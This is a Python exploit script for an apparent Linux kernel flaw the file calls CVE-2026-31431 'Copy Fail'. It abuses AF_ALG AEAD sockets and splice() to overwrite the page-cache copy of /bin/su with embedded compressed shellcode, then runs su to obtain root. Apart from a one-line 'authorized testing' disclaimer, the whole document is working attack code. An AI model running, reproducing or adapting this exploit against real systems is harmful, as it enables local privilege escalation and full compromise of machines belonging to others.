#!/usr/bin/env python3
"""
CVE-2026-31431 "Copy Fail" Exploit
Python 3.9+ compatible (includes splice() syscall wrapper)

This exploit targets a Linux kernel vulnerability in the authencesn AEAD
cryptographic implementation that allows arbitrary writes to the page cache.

For authorized security testing only.
"""
import os
import zlib
import socket
import ctypes
import ctypes.util

# Python 3.9 doesn't have os.splice(), so we implement it via ctypes
# This makes the exploit portable across Python versions

# Load libc
libc = ctypes.CDLL(ctypes.util.find_library('c'))

# Define off64_t type (loff_t in kernel)
class off64_t(ctypes.c_int64):
    pass

# Configure splice() syscall signature
# ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out,
#                size_t len, unsigned int flags)
libc.splice.argtypes = [
    ctypes.c_int, ctypes.POINTER(off64_t),
    ctypes.c_int, ctypes.POINTER(off64_t),
    ctypes.c_size_t, ctypes.c_uint
]
libc.splice.restype = ctypes.c_ssize_t

def splice(src, dst, count, offset_src=None, offset_dst=None):
    """
    Wrapper for splice() syscall matching Python os.splice() API
    Compatible with Python 3.9+ (which lacks os.splice())

    Args:
        src: Source file descriptor
        dst: Destination file descriptor
        count: Number of bytes to splice
        offset_src: Offset in source (None = current position)
        offset_dst: Offset in destination (None = current position)
    """
    p_off_src = ctypes.pointer(off64_t(offset_src)) if offset_src is not None else None
    p_off_dst = ctypes.pointer(off64_t(offset_dst)) if offset_dst is not None else None
    result = libc.splice(src, p_off_src, dst, p_off_dst, count, 0)
    if result < 0:
        raise OSError(f"splice() failed with return code {result}")
    return result

def d(x):
    """Decode hex string"""
    return bytes.fromhex(x)

def c(f, t, payload):
    """
    Core exploitation function
    f: target file descriptor
    t: offset in target file
    payload: 4 bytes to write at offset
    """
    # Create AF_ALG socket
    a = socket.socket(38, 5, 0)  # AF_ALG, SOCK_SEQPACKET
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

    h = 279  # SOL_ALG
    v = a.setsockopt

    # Set AEAD key
    v(h, 1, d('0800010000000010' + '0'*64))  # ALG_SET_KEY

    # Set AEAD authsize
    v(h, 5, None, 4)  # ALG_SET_AEAD_AUTHSIZE

    # Accept operation socket
    u, _ = a.accept()

    o = t + 4  # Offset calculation
    i = d('00')  # Zero byte

    # Send message with ancillary data (triggers vulnerability)
    u.sendmsg(
        [b"A"*4 + payload],
        [
            (h, 3, i*4),           # ALG_SET_IV
            (h, 2, b'\x10' + i*19), # ALG_SET_OP
            (h, 4, b'\x08' + i*3),  # ALG_SET_AEAD_ASSOCLEN
        ],
        32768
    )

    # Create pipe for splice
    r, w = os.pipe()

    # Splice file into pipe, then pipe into socket
    # This is where the page cache manipulation happens
    splice(f, w, o, offset_src=0)
    splice(r, u.fileno(), o)

    # Trigger processing
    try:
        u.recv(8 + t)
    except:
        pass

    u.close()
    a.close()

# Target the su binary
TARGET_BINARY = "/bin/su"  # Primary target (most systems)
FALLBACK_TARGET = "/usr/bin/su"  # Fallback for some distributions

def set_target():
    """Determine which su binary exists and should be targeted"""
    if os.path.exists(TARGET_BINARY):
        return TARGET_BINARY
    elif os.path.exists(FALLBACK_TARGET):
        return FALLBACK_TARGET
    else:
        raise FileNotFoundError(f"Could not find su binary. Tried: {TARGET_BINARY}, {FALLBACK_TARGET}")

# Main exploit
print("[*] CVE-2026-31431 Copy Fail Exploit")
target_path = set_target()
print(f"[*] Target: {target_path}")
print()

try:
    # Open target file
    f = os.open(target_path, os.O_RDONLY)
    print(f"[+] Opened {target_path} (fd={f})")
except PermissionError:
    print(f"[-] Permission denied. Please run as root or with sufficient privileges.")
    exit(1)
except FileNotFoundError:
    print(f"[-] Target {target_path} not found.")
    exit(1)

# Decompress shellcode
i = 0
e = zlib.decompress(d(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

print(f"[+] Shellcode size: {len(e)} bytes")
print(f"[+] Patching {target_path} in page cache...")

# Write shellcode 4 bytes at a time
while i < len(e):
    c(f, i, e[i:i+4])
    i += 4
    if i % 16 == 0:
        print(f"    Written {i}/{len(e)} bytes...")

print("[+] Page cache patching complete!")
print("[+] Executing modified su...")
print()

# Execute patched su - should give root
os.system(f"su")